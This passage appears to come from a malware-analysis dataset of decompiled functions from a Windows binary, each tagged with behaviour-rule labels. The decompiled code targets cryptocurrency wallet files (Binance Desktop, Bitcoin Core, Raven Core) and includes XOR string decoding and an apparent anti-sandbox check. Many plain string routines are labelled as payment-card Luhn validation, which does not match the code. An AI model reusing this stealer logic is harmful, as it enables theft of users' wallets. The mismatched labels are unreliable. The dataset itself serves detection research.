in_stack_fffff8dc, \n                 in_stack_fffff8e0, in_stack_fffff8e4, in_stack_fffff8e8, in_stack_fffff8ec, uVar11, uVar6, \n                 in_stack_fffff8f8, in_stack_fffff8fc, in_stack_fffff900, in_stack_fffff904, in_stack_fffff908, \n                 in_stack_fffff90c, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffff890;\n    uVar7 = 0x40d108;\n    uVar2 = *0x44611c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x24;\n    *(unaff_EBP + -0x14) = &stack0xfffff870;\n    uVar11 = 0xf;\n    uVar10 = 0;\n    pcVar4 = \"Binance Desktop\";\n    in_stack_fffff870 = in_stack_fffff870 & 0xffffff00;\n    uVar6 = 0x40d129;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0x25;\n    *(unaff_EBP + -0x10) = &stack0xfffff850;\n    uVar1 = *0x4461d0;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar9 = 0x40d14b;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff850, in_stack_fffff854, in_stack_fffff858, in_stack_fffff85c, \n                 in_stack_fffff860, in_stack_fffff864, uVar6, pcVar4, in_stack_fffff870, in_stack_fffff874, \n                 in_stack_fffff878, in_stack_fffff87c, uVar10, uVar11, uVar7, uVar2, in_stack_fffff890, \n                 in_stack_fffff894, in_stack_fffff898, in_stack_fffff89c, in_stack_fffff8a0, in_stack_fffff8a4, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffff828;\n    uVar8 = 0xf;\n    uVar7 = 0;\n    pcVar3 = \"simple-storage.json\";\n    in_stack_fffff828 = in_stack_fffff828 & 0xffffff00;\n    uVar11 = 0x40d165;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0x26;\n    *(unaff_EBP + -0x14) = &stack0xfffff808;\n    uVar10 = 0xf;\n    uVar6 = 0;\n    pcVar4 = \"Binance Desktop\";\n    in_stack_fffff808 = in_stack_fffff808 & 0xffffff00;\n    uVar2 = 0x40d186;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0x27;\n    *(unaff_EBP + -0x10) = &stack0xfffff7e8;\n    uVar1 = *0x4461d0;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar5 = 0x40d1a8;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff7e8, in_stack_fffff7ec, in_stack_fffff7f0, in_stack_fffff7f4, \n                 in_stack_fffff7f8, in_stack_fffff7fc, uVar2, pcVar4, in_stack_fffff808, in_stack_fffff80c, \n                 in_stack_fffff810, in_stack_fffff814, uVar6, uVar10, uVar11, pcVar3, in_stack_fffff828, \n                 in_stack_fffff82c, in_stack_fffff830, in_stack_fffff834, uVar7, uVar8, uVar9);\n    *(unaff_EBP + -0x18) = &stack0xfffff7c0;\n    uVar9 = 0xf;\n    uVar8 = 0;\n    pcVar3 = \".finger-print.fp\";\n    in_stack_fffff7c0 = in_stack_fffff7c0 & 0xffffff00;\n    uVar11 = 0x40d1c2;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0x28;\n    *(unaff_EBP + -0x14) = &stack0xfffff7a0;\n    uVar10 = 0xf;\n    uVar6 = 0;\n    pcVar4 = \"Binance Desktop\";\n    in_stack_fffff7a0 = in_stack_fffff7a0 & 0xffffff00;\n    uVar2 = 0x40d1e3;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0x29;\n    *(unaff_EBP + -0x10) = &stack0xfffff780;\n    uVar1 = *0x4461d0;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40d205;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff780, in_stack_fffff784, in_stack_fffff788, in_stack_fffff78c, \n                 in_stack_fffff790, in_stack_fffff794, uVar2, pcVar4, in_stack_fffff7a0, in_stack_fffff7a4, \n                 in_stack_fffff7a8, in_stack_fffff7ac, uVar6, uVar10, uVar11, pcVar3, in_stack_fffff7c0, \n                 in_stack_fffff7c4, in_stack_fffff7c8, in_stack_fffff7cc, uVar8, uVar9, uVar5);\n    *(unaff_EBP + -0x18) = &stack0xfffff758;\n    uVar11 = 0x40d218;\n    uVar6 = *0x446158;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x2a;\n    *(unaff_EBP + -0x14) = &stack0xfffff738;\n    uVar10 = 0x40d232;\n    uVar2 = *0x445b3c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x2b;\n    *(unaff_EBP + -0x10) = &stack0xfffff718;\n    uVar1 = *0x445c18;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40d255;\n    fcn.0040c3cb(unaff_ESI, 1, uVar1, in_stack_fffff718, in_stack_fffff71c, in_stack_fffff720, in_stack_fffff724, \n                 in_stack_fffff728, in_stack_fffff72c, uVar10, uVar2, in_stack_fffff738, in_stack_fffff73c, \n                 in_stack_fffff740, in_stack_fffff744, in_stack_fffff748, in_stack_fffff74c, uVar11, uVar6, \n                 in_stack_fffff758, in_stack_fffff75c, in_stack_fffff760, in_stack_fffff764, in_stack_fffff768, \n                 in_stack_fffff76c, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffff6f0;\n    uVar11 = 0x40d268;\n    uVar6 = *0x445e58;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x2c;\n    *(unaff_EBP + -0x14) = &stack0xfffff6d0;\n    uVar10 = 0x40d282;\n    uVar2 = *0x445b3c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x2d;\n    *(unaff_EBP + -0x10) = &stack0xfffff6b0;\n    uVar1 = *0x445c18;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40d2a5;\n    fcn.0040c3cb(unaff_ESI, 1, uVar1, in_stack_fffff6b0, in_stack_fffff6b4, in_stack_fffff6b8, in_stack_fffff6bc, \n                 in_stack_fffff6c0, in_stack_fffff6c4, uVar10, uVar2, in_stack_fffff6d0, in_stack_fffff6d4, \n                 in_stack_fffff6d8, in_stack_fffff6dc, in_stack_fffff6e0, in_stack_fffff6e4, uVar11, uVar6, \n                 in_stack_fffff6f0, in_stack_fffff6f4, in_stack_fffff6f8, in_stack_fffff6fc, in_stack_fffff700, \n                 in_stack_fffff704, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffff688;\n    uVar11 = 0x40d2b8;\n    uVar6 = *0x445c54;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x2e;\n    *(unaff_EBP + -0x14) = &stack0xfffff668;\n    uVar10 = 0x40d2d2;\n    uVar2 = *0x445f48;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x2f;\n    *(unaff_EBP + -0x10) = &stack0xfffff648;\n    uVar1 = *0x445ee8;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar5 = 0x40d2f4;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff648, in_stack_fffff64c, in_stack_fffff650, in_stack_fffff654, \n                 in_stack_fffff658, in_stack_fffff65c, uVar10, uVar2, in_stack_fffff668, in_stack_fffff66c, \n                 in_stack_fffff670, in_stack_fffff674, in_stack_fffff678, in_stack_fffff67c, uVar11, uVar6, \n                 in_stack_fffff688, in_stack_fffff68c, in_stack_fffff690, in_stack_fffff694, in_stack_fffff698, \n                 in_stack_fffff69c, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffff620;\n    uVar9 = 0xf;\n    uVar7 = 0;\n    uVar11 = 0x43e200;\n    in_stack_fffff620 = in_stack_fffff620 & 0xffffff00;\n    uVar10 = 0x40d30e;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0x30;\n    *(unaff_EBP + -0x14) = &stack0xfffff600;\n    uVar6 = 0x40d328;\n    uVar2 = *0x445e34;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x31;\n    *(unaff_EBP + -0x10) = &stack0xfffff5e0;\n    uVar1 = *0x445b58;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40d34b;\n    fcn.0040c3cb(unaff_ESI, 1, uVar1, in_stack_fffff5e0, in_stack_fffff5e4, in_stack_fffff5e8, in_stack_fffff5ec, \n                 in_stack_fffff5f0, in_stack_fffff5f4, uVar6, uVar2, in_stack_fffff600, in_stack_fffff604, \n                 in_stack_fffff608, in_stack_fffff60c, in_stack_fffff610, in_stack_fffff614, uVar10, uVar11, \n                 in_stack_fffff620, in_stack_fffff624, in_stack_fffff628, in_stack_fffff62c, uVar7, uVar9, uVar5);\n    *(unaff_EBP + -0x18) = &stack0xfffff5b8;\n    uVar7 = 0xf;\n    uVar11 = 0;\n    pcVar4 = \"*.json\";\n    in_stack_fffff5b8 = in_stack_fffff5b8 & 0xffffff00;\n    uVar10 = 0x40d365;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0x32;\n    *(unaff_EBP + -0x14) = &stack0xfffff598;\n    uVar6 = 0x40d37f;\n    uVar2 = *0x44608c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x33;\n    *(unaff_EBP + -0x10) = &stack0xfffff578;\n    uVar1 = *0x445ec8;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff578, in_stack_fffff57c, in_stack_fffff580, in_stack_fffff584, \n                 in_stack_fffff588, in_stack_fffff58c, uVar6, uVar2, in_stack_fffff598, in_stack_fffff59c, \n                 in_stack_fffff5a0, in_stack_fffff5a4, in_stack_fffff5a8, in_stack_fffff5ac, uVar10, pcVar4, \n                 in_stack_fffff5b8, in_stack_fffff5bc, in_stack_fffff5c0, in_stack_fffff5c4, uVar11, uVar7, uVar8);\n    fcn.0040c903(\"Bitcoin Core\", *(unaff_ESI + 0x20), 1);\n    fcn.0040c903(\"Bitcoin Core Old\", *(unaff_ESI + 0x20), 0);\n    fcn.0040c903(0x43e2a4, *(unaff_ESI + 0x20), 0);\n    fcn.0040c903(\"Raven Core\", *(unaff_ESI + 0x20), 0);\n    fcn.0040c903(0x43e2d0, *(unaff_ESI + 0x20), 0);\n    fcn.0040c903(0x43e2ec, *(unaff_ESI + 0x20), 0);\n    fcn.0040c903(0x43e334, *(unaff_ESI + 0x20), 0);\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 16496
    },
    "00411465": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00411465(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_10h;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_4h;\n    \n    fcn.004208fe(0x5c);\n    *(unaff_EBP + -0x24) = str.0123456789ABCDEF._0_4_;\n    *(unaff_EBP + -0x20) = str.0123456789ABCDEF._4_4_;\n    *(unaff_EBP + -0x1c) = str.0123456789ABCDEF._8_4_;\n    *(unaff_EBP + -0x18) = str.0123456789ABCDEF._12_4_;\n    *(unaff_EBP + -0x60) = extraout_ECX;\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 8);\n    *(unaff_EBP + -100) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x14) = str.0123456789ABCDEF[16];\n    iVar2 = (**0x4463a4)(*(unaff_EBP + 8));\n    if (0 < iVar2) {\n        pcVar1 = *(unaff_EBP + -0x68);\n        iVar2 = fcn.0041f2e0(unaff_EBP + -0x24, *pcVar1);\n        if ((iVar2 != 0) && (iVar2 = fcn.0041f2e0(unaff_EBP + -0x24, pcVar1[1]),  iVar2 != 0)) {\n            iVar2 = (**0x4463a4)(pcVar1);\n            iVar2 = iVar2 + -1;\n            **(unaff_EBP + -100) = iVar2;\n            uVar3 = (**0x446508)(8, iVar2);\n            iVar4 = (**0x446490)(uVar3);\n            **(unaff_EBP + -0x60) = iVar4;\n            if (iVar4 != 0) {\n                *(unaff_EBP + -0x30) = 0;\n                *(unaff_EBP + -0x2c) = 0xf;\n                *(unaff_EBP + -0x40) = 0;\n                fcn.00403f50();\n                *(unaff_EBP + -4) = 0;\n                arg_10h = fcn.0040bfdc(unaff_EBP + -0x40, 2, 0xffffffff);\n                if (0xf < arg_10h[5]) {\n                    arg_10h = *arg_10h;\n                }\n                fcn.0041e7a2(**(unaff_EBP + -0x60), iVar2, arg_10h);\n                fcn.00403f73();\n                fcn.00403f73(1, 0);\n            }\n        }\n    }\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 776
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401000(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    // [00] -r-x section size 208896 named .text\n    uVar1 = (**0x446528)(0, 2000, 0x3000, 0x40, 0);\n    iVar2 = (**0x4464e0)(uVar1);\n    if (iVar2 == 0) {\n        (**0x446410)(0);\n    }\n    iVar2 = (**0x446458)(0, 399000000, 0x3000, 4);\n    if (iVar2 != 0) {\n        fcn.004257d0(iVar2, 0, 99000000);\n        iVar2 = (**0x446380)(iVar2, 399000000, 0x8000);\n    }\n    return iVar2;\n}\n",
        "token_count": 200
    },
    "00403e47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403e47(int32_t arg_8h, int32_t lpString)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    uint8_t *puVar3;\n    uint32_t var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, unaff_EBX + 1);\n    var_4h = 0;\n    *(iVar1 + unaff_EBX) = 0;\n    if (unaff_EBX != 0) {\n        do {\n            puVar3 = var_4h + iVar1;\n            uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            uVar2 = var_4h % uVar2;\n            var_4h = var_4h + 1;\n            *puVar3 = *(uVar2 + lpString) ^ puVar3[arg_8h - iVar1];\n        } while (var_4h < unaff_EBX);\n    }\n    return iVar1;\n}\n",
        "token_count": 245
    },
    "00403f0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403f0c(void)\n\n{\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (unaff_EDI != unaff_ESI) {\n        fcn.00403f73(1, 0);\n        if (unaff_ESI[5] < 0x10) {\n            fcn.0041e300(unaff_EDI, unaff_ESI, unaff_ESI[4] + 1);\n        }\n        else {\n            *unaff_EDI = *unaff_ESI;\n            *unaff_ESI = 0;\n        }\n        unaff_EDI[4] = unaff_ESI[4];\n        unaff_EDI[5] = unaff_ESI[5];\n        unaff_ESI[4] = 0;\n        unaff_ESI[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00403fb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00403fb5(uint *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = fcn.00404124(param_2);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.004040c2(param_2, 0);\n        if (cVar1 != '\\0') {\n            puVar2 = param_1;\n            if (0xf < param_1[5]) {\n                puVar2 = *param_1;\n            }\n            fcn.00420150(puVar2, param_2, param_2);\n            param_1[4] = param_2;\n            puVar2 = param_1;\n            if (0xf < param_1[5]) {\n                puVar2 = *param_1;\n            }\n            *(puVar2 + param_2) = 0;\n        }\n    }\n    else {\n        puVar2 = param_1;\n        if (0xf < param_1[5]) {\n            puVar2 = *param_1;\n        }\n        param_1 = fcn.00404029(param_1, param_2 - puVar2, param_2);\n    }\n    return param_1;\n}\n",
        "token_count": 288
    },
    "00404029": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404029(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint *arg_8h_00;\n    uint32_t arg_10h_00;\n    \n    uVar2 = arg_8h[4];\n    uVar3 = arg_ch;\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.0041d5f3(\"invalid string position\");\n        uVar3 = extraout_ECX;\n    }\n    arg_10h_00 = uVar2 - uVar3;\n    if (arg_10h < uVar2 - uVar3) {\n        arg_10h_00 = arg_10h;\n    }\n    if (in_ECX == arg_8h) {\n        fcn.0040415d(arg_10h_00 + uVar3, 0xffffffff);\n        fcn.0040415d(0, arg_ch);\n    }\n    else {\n        cVar1 = fcn.004040c2(arg_10h_00, 0);\n        if (cVar1 != '\\0') {\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            arg_8h_00 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                arg_8h_00 = *in_ECX;\n            }\n            fcn.00420150(arg_8h_00, arg_8h + arg_ch, arg_10h_00);\n            in_ECX[4] = arg_10h_00;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(in_ECX + arg_10h_00) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 452
    },
    "00404124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00404124(uint *param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    \n    if (param_2 != NULL) {\n        puVar1 = param_1;\n        if (0xf < param_1[5]) {\n            puVar1 = *param_1;\n        }\n        if (puVar1 <= param_2) {\n            puVar1 = param_1;\n            if (0xf < param_1[5]) {\n                puVar1 = *param_1;\n            }\n            if (param_2 < param_1[4] + puVar1) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "0040415d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0040415d(uint *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    uVar2 = param_1[4];\n    uVar3 = param_2;\n    if (uVar2 < param_2) {\n        uVar2 = fcn.0041d5f3(\"invalid string position\");\n        uVar3 = extraout_ECX;\n    }\n    uVar2 = uVar2 - uVar3;\n    if (uVar2 < param_2) {\n        param_2 = uVar2;\n    }\n    if (param_2 != 0) {\n        puVar5 = param_1;\n        puVar4 = param_1;\n        if (0xf < param_1[5]) {\n            puVar5 = *param_1;\n            puVar4 = *param_1;\n        }\n        fcn.0041e300(puVar5 + uVar3, puVar4 + param_2 + uVar3, uVar2 - param_2);\n        iVar1 = param_1[4];\n        param_1[4] = iVar1 - param_2;\n        puVar4 = param_1;\n        if (0xf < param_1[5]) {\n            puVar4 = *param_1;\n        }\n        *(puVar4 + (iVar1 - param_2)) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 360
    },
    "004041d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004041d3(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t arg_10h;\n    uint uVar3;\n    uint *puVar4;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar5;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004208c8(0xc);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    uVar5 = *(unaff_EBP + 8) | 0xf;\n    if (uVar5 == 0xffffffff) {\n        uVar5 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar1 = extraout_ECX[5];\n        *(unaff_EBP + -0x14) = uVar1;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar2 = *(unaff_EBP + -0x14);\n        if ((uVar5 / 3 < uVar2) && (uVar5 = 0xfffffffe,  uVar1 <= -uVar2 - 2)) {\n            uVar5 = uVar2 + uVar1;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00404338(uVar5 + 1);\n    *(unaff_EBP + 8) = uVar3;\n    arg_10h = *(unaff_EBP + 0xc);\n    if (arg_10h != 0) {\n        puVar4 = extraout_ECX;\n        if (0xf < extraout_ECX[5]) {\n            puVar4 = *extraout_ECX;\n        }\n        fcn.00420150(*(unaff_EBP + 8), puVar4, arg_10h);\n    }\n    fcn.00403f73(1, 0);\n    puVar4 = *(unaff_EBP + 8);\n    *extraout_ECX = puVar4;\n    extraout_ECX[5] = uVar5;\n    extraout_ECX[4] = arg_10h;\n    if (uVar5 < 0x10) {\n        puVar4 = extraout_ECX;\n    }\n    *(puVar4 + arg_10h) = 0;\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 589
    },
    "004043b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043b8(uint *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar2 = arg_8h[4];\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.0041d5f3(\"invalid string position\");\n    }\n    if (uVar2 - arg_ch < in_EAX) {\n        in_EAX = uVar2 - arg_ch;\n    }\n    iVar3 = unaff_ESI[4];\n    if (-iVar3 - 1U <= in_EAX) {\n        iVar3 = fcn.0041d5a6(\"string too long\");\n    }\n    if (in_EAX != 0) {\n        iVar3 = iVar3 + in_EAX;\n        cVar1 = fcn.004040c2(iVar3, 0);\n        if (cVar1 != '\\0') {\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar4 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n            }\n            fcn.00420150(unaff_ESI[4] + puVar4, arg_8h + arg_ch, in_EAX);\n            unaff_ESI[4] = iVar3;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + iVar3) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "0040444d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040444d(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *unaff_EBX;\n    uint *unaff_ESI;\n    uint var_4h;\n    \n    if (arg_8h <= unaff_EBX[4]) {\n        uVar3 = unaff_EBX[4] - arg_8h;\n        if (uVar3 < in_EAX) {\n            in_EAX = uVar3;\n        }\n        iVar4 = unaff_ESI[4];\n        if (-iVar4 - 1U <= in_EAX) {\n            iVar4 = fcn.0041d5a6(\"string too long\");\n        }\n        if (in_EAX != 0) {\n            iVar4 = iVar4 + in_EAX;\n            cVar2 = fcn.004040c2(iVar4, 0);\n            if (cVar2 != '\\0') {\n                puVar5 = unaff_ESI;\n                puVar6 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar5 = *unaff_ESI;\n                    puVar6 = *unaff_ESI;\n                }\n                fcn.0041e300(puVar5 + in_EAX, puVar6, unaff_ESI[4]);\n                if (unaff_ESI == unaff_EBX) {\n                    if (arg_8h != 0) {\n                        arg_8h = arg_8h + in_EAX;\n                    }\n                    puVar5 = unaff_ESI;\n                    puVar6 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar5 = *unaff_ESI;\n                        puVar6 = *unaff_ESI;\n                    }\n                    fcn.0041e300(puVar5, puVar6 + arg_8h, in_EAX);\n                }\n                else {\n                    if (0xf < unaff_EBX[5]) {\n                        unaff_EBX = *unaff_EBX;\n                    }\n                    puVar6 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar6 = *unaff_ESI;\n                    }\n                    fcn.00420150(puVar6, unaff_EBX + arg_8h, in_EAX);\n                }\n                unaff_ESI[4] = iVar4;\n                if (0xf < unaff_ESI[5]) {\n                    unaff_ESI = *unaff_ESI;\n                }\n                *(unaff_ESI + iVar4) = 0;\n            }\n        }\n        return;\n    }\n    fcn.0041d5f3(\"invalid string position\");\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 658
    },
    "00404546": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404546(int32_t param_1)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.00404124();\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.0041d5a6(\"string too long\");\n        }\n        if (unaff_EDI != 0) {\n            iVar2 = iVar2 + unaff_EDI;\n            cVar1 = fcn.004040c2(iVar2, 0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                puVar4 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                    puVar4 = *in_EAX;\n                }\n                fcn.0041e300(puVar3 + unaff_EDI, puVar4, in_EAX[4]);\n                puVar4 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar4 = *in_EAX;\n                }\n                fcn.00420150(puVar4, param_1, unaff_EDI);\n                in_EAX[4] = iVar2;\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + iVar2) = 0;\n            }\n        }\n    }\n    else {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        fcn.0040444d(param_1 - in_EAX);\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "0040460f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040460f(void)\n\n{\n    uint32_t in_EAX;\n    \n    fcn.0042c580(in_EAX + 0xb6109100, (in_EAX >> 0x1f) + 2 + (0x49ef6eff < in_EAX), 10000000, 0);\n    return;\n}\n",
        "token_count": 79
    },
    "0040462c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040462c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t arg_10h;\n    uint32_t uVar3;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *(unaff_ESI + 0x30);\n    var_8h = *(unaff_EDI + 0xc);\n    uVar2 = *(unaff_ESI + 0x34);\n    if (uVar2 < var_4h) {\n        uVar2 = *(unaff_ESI + 0x2c);\n    }\n    uVar3 = *(unaff_EDI + 0x10);\n    arg_10h = uVar2 - var_4h;\n    if (uVar3 < uVar2 - var_4h) {\n        arg_10h = uVar3;\n    }\n    if ((arg_10h != 0) && (arg_8h == -5)) {\n        arg_8h = 0;\n    }\n    *(unaff_EDI + 0x14) = *(unaff_EDI + 0x14) + arg_10h;\n    *(unaff_EDI + 0x10) = uVar3 - arg_10h;\n    if (*(unaff_ESI + 0x38) != NULL) {\n        uVar1 = (**(unaff_ESI + 0x38))(*(unaff_ESI + 0x3c), var_4h, arg_10h);\n        *(unaff_ESI + 0x3c) = uVar1;\n        *(unaff_EDI + 0x30) = uVar1;\n    }\n    if (arg_10h != 0) {\n        fcn.00420150(var_8h, var_4h, arg_10h);\n        var_8h = var_8h + arg_10h;\n        var_4h = var_4h + arg_10h;\n    }\n    if (var_4h == *(unaff_ESI + 0x2c)) {\n        var_4h = *(unaff_ESI + 0x28);\n        if (*(unaff_ESI + 0x34) == *(unaff_ESI + 0x2c)) {\n            *(unaff_ESI + 0x34) = var_4h;\n        }\n        uVar2 = *(unaff_EDI + 0x10);\n        uVar3 = *(unaff_ESI + 0x34) - var_4h;\n        if (uVar2 < uVar3) {\n            uVar3 = uVar2;\n        }\n        if ((uVar3 != 0) && (arg_8h == -5)) {\n            arg_8h = 0;\n        }\n        *(unaff_EDI + 0x14) = *(unaff_EDI + 0x14) + uVar3;\n        *(unaff_EDI + 0x10) = uVar2 - uVar3;\n        if (*(unaff_ESI + 0x38) != NULL) {\n            uVar1 = (**(unaff_ESI + 0x38))(*(unaff_ESI + 0x3c), var_4h, 